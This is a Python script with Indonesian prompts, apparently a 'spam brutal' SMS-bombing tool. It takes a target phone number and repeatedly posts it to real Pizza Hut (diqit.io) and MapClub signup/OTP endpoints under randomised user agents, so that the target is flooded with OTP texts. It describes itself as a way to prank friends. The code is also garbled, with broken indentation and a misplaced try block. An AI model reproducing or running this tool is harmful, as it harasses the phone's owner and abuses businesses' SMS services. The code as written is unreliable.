# Semoga, allah, melaknat orang-orang yang suka rekod sc orang, aamiin
import threading, os, sys, json, time
from bs4 import BeautifulSoup as bs
import requests as ru
from fake_useragent import UserAgent
from warn.warn import *
from etc.bener import *
from etc.ua import *
from etc.loding import *
class main:
 def main():
  hyu = str(input(f"{kun}[{kan}•{kun}] {im}Masukkan pilihan : "))
  if (hyu == '1') or (hyu == '01'):
   os.system("clear")
   bnr()
   main.start()
  elif (hyu == '2') or (hyu == '02'):
   os.system("xdg-open https://chat.whatsapp.com/LqEGHqFtQBwLEUbemADmTk")
   main.main()
  elif (hyu == '3') or (hyu == '03'):
   os.system("clear")
   bnr()
   print (f"          {tot}TENTANG TOOL INI{sop}   ")
   print (f"""
{kan}Tools spam all for one adalah {kon}spam brutal (sms, wa, call) yang dibuat untuk menjahili teman kalian
{kan}Bantu terus admin mengembangkan tools ini, dengan cara tidak merecode sc ini 'v'""")
   os.system("python brutal.py")
  elif (hyu == '4') or (hyu == '04'):
   os.system("git pull")
   main.main()
  else:
   print (f"{kun}[{kan}•{kun}] {kun}Masukkan pilihan dengan benar")
   main.main()
 def start():
  try:
      nom=str(input(f"{kun}[{kan}•{kun}] {im}Masukkan nomor target (ex:88xx) : "))
      if len(nom) <= 5: print (f"{kun}[{kan}•{kun}] {kun}Mohon, masukkan no telp dengan benar");main.start()
      print (f"\r{kun}[{kan}•{kun}] {kan}Ok, memulai spamming...")
      print (f"{kun}[{kan}•{kun}] {im}Target : {kon}{nom}")
      spam.piza(nom)
      loding()
      spam.map(nom)
      loding()
      print (f"{ken}[{kun}•{ken}] {kan}Proses selesai")
      sys.exit()
  except ru.ConnectionError:print (f"{ken}[{kun}•{ken}]{kan} Koneksi Error")
  except KeyboardInterrupt:print (f"{ken}[{kun}•{ken}]{kun} Program dihentikan")
import itertools
kuni  = '\x1b[33m'
def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write(f'\r{kun}[{kan}•{kun}] {kuni}Loading {kun}' + c+"\n")
        sys.stdout.flush()
        time.sleep(0.1)
class spam:
 def piza(nom):
    hd = {
    'user-agent': ua.random ,
    'referer': 'https://www.phd.co.id/register',
    'Host': 'api-prod.diqit.io',
    'content-type':'application/json;charset=UTF-8',
    }
    dat = {'phone':nom}
    for x in range(20):
     sia = ru.post("https://api-prod.diqit.io/customer/v1/customer/register", headers=hd, json=dat)
    if 'error' in sia:print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({im}{kun}SMS{kan}) {ken}Pizzahut{kun} Gagal")
    else:print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({im}{kun}SMS{kan}) {ken}Pizzahut{kan} OK")
  def map(nom):
    hd = {
    "Connection": "keep-alive",
    "user-agent": ua.random ,
    }
    dat = {'phone':'62'+nom}
    for x in range(25):
        pil = ru.post("https://cmsapi.mapclub.com/api/signup-otp",data=dat,headers=hd)
    if 'error' in pil:print (f"{ken}[{kun}•{ken}] {ken}Spam {kun}({im}{kun}SMS{kun}) {ken}Mapclub{kun} Gagal")
    else:print (f"{ken}[{kun}•{ken}] {ken}Spam {kan}({im}{kun}SMS{kan}) {ken}MapClub{kan} Ok")
 try:
 os.system("clear")
 bnr()
 menu=["Mulai","Grup WhatsApp","Info Tools","Update"]
 print (f"         {tot}MENU{sop}        ")
 for i in range(len(menu)):
   print (f"{ken} [0"+str(i+1).ljust(1)+"] \033[31m"+menu[i])
 main.main()
except ru.ConnectionError:print (f"{ken}[{kun}•{ken}] {kun}Koneksi Error")
except KeyboardInterrupt:print (f"{ken}[{kun}•{ken}] {kun}Program dihentikkan paksa")
